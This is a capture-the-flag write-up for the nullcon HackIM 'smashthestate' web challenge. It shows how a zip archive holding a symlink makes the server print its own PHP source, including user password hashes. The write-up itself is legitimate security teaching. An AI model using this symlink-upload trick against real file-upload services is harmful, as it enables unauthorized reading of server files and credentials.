# nullcon HackIM : smashthestate

**Category:** Web
**Points:** 400
**Solves:**
**Description:**

> This beautiful website for testing zip files contains a replica of a vulnerability found in a well known bug bounty site.
>
> Log in with rob:smashthestate then exploit the vulnerability to gain access to the 'admin' account and the flag.
>
> Automated tools and bruteforcing will not help you solve this challenge.
>
>
> <http://54.152.101.3/>

[index.php](./index.php)

## Write-up

by d1rt

Logging into the server with the `rob:smashthestate` combo takes you to a form that promises to allow you to upload and confirm zip file contents, if you upload a zip file containing a directory you'll be given an error from the `cat` command printed on screen.

`cat: /var/www/html/tmp/upload_18vrn198vcn191nv1/test: Is a directory`

Make a local symlink, then store it in a zip file that preserves symlinks

```
$ ln -s ../../index.php flag
$ zip -y flag.zip flag
  adding: flag (stored 0%)
```

Upload this to the server and you'll get the source code of `index.php` dumped to the page

```
<!--?php
$FAKE_DATABASE = array (
    "rob" =--> "60df0ab1a78fd0d95a4cfa4b0854931b", // smashthestate
    "admin" =&gt; "6ec4b9f5cd1d4fd45746f8e592aa321e",
);
$page = $_GET['page'];

switch ($page) {
    case "login":
        echo "trying to log in";
        $user = $_POST['user'];
        $pass = $_POST['pass'];
...snip...
```

There is a section the appears to dump the flag:

```
    case "admin_login_help":
        session_start();
        if(!isset($_SESSION['login_code']) ){
            $_SESSION['login_code'] = bin2hex(openssl_random_pseudo_bytes(18));
            echo "khack has disabled zis function, please click <a href="?page=code_submit">here</a>\n";
        }
        else {
            echo "khack has disabled the function for zis session";
        }
        break;
    case "code_submit":
        session_start();
        $code = $_POST['code'];
        if (isset($code) &amp;&amp; isset($_SESSION['login_code'])) {
            if ($code == "khack" ){
                echo "Flag: ";
                passthru("sudo /bin/cat /var/www/html/flag");
            }
            else {
                echo "Invalid code";
            }
        }
        else {
            echo "<form action="?page=code_submit" method="POST">Please input the login code:<input name="code"><input type="submit" value="submit"></form>";
        }
```

**it is a lie and always dumps an empty flag**

just submit the md5i hash of the admin password, done.


## Other write-ups and resources

* <http://losfuzzys.github.io/writeup/2016/02/02/hackim2016-smashthestate400/>
* [0x90r00t](https://0x90r00t.com/2016/02/03/hackim-2016web-400-smashthestate-write-up/)
